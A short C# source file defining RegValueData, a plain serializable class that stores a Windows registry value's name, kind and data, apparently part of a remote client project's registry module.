using System;
using Microsoft.Win32;

namespace xClient.Core.Registry;

[Serializable]
public class RegValueData
{
	public string Name { get; set; }

	public RegistryValueKind Kind { get; set; }

	public object Data { get; set; }

	public RegValueData(string name, RegistryValueKind kind, object data)
	{
		Name = name;
		Kind = kind;
		Data = data;
	}

	public override string ToString()
	{
		return $"({Name}:{Kind}:{Data})";
	}
}
